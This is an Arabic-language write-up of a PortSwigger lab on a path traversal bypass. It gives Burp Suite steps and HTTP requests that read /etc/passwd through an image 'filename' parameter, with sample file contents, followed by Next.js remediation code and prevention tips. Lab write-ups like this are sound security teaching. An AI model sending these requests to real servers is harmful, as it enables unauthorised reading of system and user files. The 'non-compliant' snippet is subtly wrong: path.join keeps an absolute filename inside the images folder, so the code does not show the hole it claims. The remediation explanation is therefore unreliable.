# Lab: File path traversal, traversal sequences blocked with absolute path bypass

> **Category:** Path Traversal  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة Path Traversal في عرض صور المنتجات، ولكن هذه المرة الخادم **يمنع تكرارات `../`**، لذلك سنستخدم **المسار المطلق (Absolute Path)** بدلاً من المسار النسبي لقراءة ملف `/etc/passwd`.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: الدخول إلى المختبر

- اضغط **Access the lab** لفتح موقع المتجر الوهمي.

### الخطوة 2: تشغيل Burp Suite واعتراض الطلب

- افتح Burp Suite وتأكد من تشغيل الـ Proxy.
- اضغط على أي منتج لعرض صورته.
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب:

```http
GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 3: إرسال الطلب إلى Repeater

- حدد الطلب، زر الماوس الأيمن → **Send to Repeater**.

### الخطوة 4: تجربة الطريقة القديمة (ستفشل)

جرب `../../../etc/passwd` أولاً:
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```
ستجد أنها **لا تعمل** لأن الخادم يحذف أو يمنع `../`.

### الخطوة 5: استخدام المسار المطلق (Absolute Path)

غير `filename` إلى:
```
/etc/passwd
```

يصبح الطلب:
```http
GET /image?filename=/etc/passwd HTTP/1.1
```

### الخطوة 6: إرسال الطلب

- اضغط **Send** في Repeater.

### الخطوة 7: مشاهدة النتيجة

ستظهر استجابة تحتوي على محتوى `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

### الخطوة 8: حل المختبر

بمجرد ظهور المحتوى، تم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **لماذا منع `../`؟** | الخادم لديه فلتر يمنع أو يحذف تكرارات `../` |
| **كيف تجاوزناه؟** | استخدمنا المسار المطلق `/etc/passwd` بدلاً من النسبي |
| **لماذا نجح المسار المطلق؟** | المبرمج نسي أن يمنع المسارات التي تبدأ بـ `/` |
| **الفرق بين النسبي والمطلق؟** | النسبي: `../../../etc/passwd` ، المطلق: `/etc/passwd` |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم منع `../` لكنه **لم يمنع المسار المطلق** الذي يبدأ بـ `/`.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
const { filename } = req.query;

// خطأ: يمنع ../ فقط لكن يسمح /etc/passwd
if (filename.includes('..')) {
  return res.status(403).send('Forbidden');
}

const filePath = path.join('public/images', filename);
fs.readFileSync(filePath);
```

---

### ✅ Compliant Code (Next.js)

```javascript
const { filename } = req.query;

// 1. امنع ../ (المسار النسبي)
if (filename.includes('..')) {
  return res.status(403).send('Forbidden');
}

// 2. امنع / (المسار المطلق)
if (filename.startsWith('/')) {
  return res.status(403).send('Forbidden');
}

// 3. استخرج اسم الملف النقي فقط
const safeFilename = path.basename(filename);
const filePath = path.join('public/images', safeFilename);
fs.readFileSync(filePath);
```

**الخلاصة:** منع `../` لحده لا يكفي، يجب أيضاً منع `/` أو استخدام `path.basename()`.

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **منع `/` و `../` معاً:** لا تسمح بأي محاولة لتغيير المسار.
2. **استخدام `path.basename()`:** يزيل أي مسارات ويستخرج اسم الملف النقي فقط.
3. **قائمة بيضاء (Whitelist):** حدد أسماء الملفات المسموحة مسبقاً.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal)
